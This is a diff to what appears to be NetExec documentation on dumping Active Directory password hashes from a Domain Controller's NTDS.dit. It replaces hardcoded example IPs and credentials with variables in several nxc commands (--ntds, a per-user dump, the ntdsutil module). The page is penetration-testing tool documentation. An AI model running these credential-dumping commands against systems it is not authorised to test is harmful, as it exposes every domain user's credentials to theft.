@@ -16,9 +16,9 @@ Requires Domain Admin or Local Admin Priviledges on target Domain Controller
 ### Dump all users from the NTDS.dit
 
 ```bash
-nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds
-nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --enabled
-nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds vss
+nxc smb $TARGET -u $USER -p $PASSWORD --ntds
+nxc smb $TARGET -u $USER -p $PASSWORD --ntds --enabled
+nxc smb $TARGET -u $USER -p $PASSWORD --ntds vss
 ```
 
 {% hint style="info" %}
@@ -28,7 +28,7 @@ You can also DCSYNC with the computer account of the DC
 ### Dump a specific user only
 
 ```bash
-nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --user Administrator
+nxc smb $TARGET -u $USER -p $PASSWORD --ntds --user Administrator
 ```
 
 {% hint style="warning" %}
@@ -38,6 +38,6 @@ In environments with multiple domains (e.g., parent/child), make sure to specify
 There is also the ntdsutil module that will use ntdsutil to dump NTDS.dit and SYSTEM hive and parse them locally with secretsdump.py&#x20;
 
 ```bash
-nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntdsutil
+nxc smb $TARGET -u $USER -p $PASSWORD -M ntdsutil
 ```
 
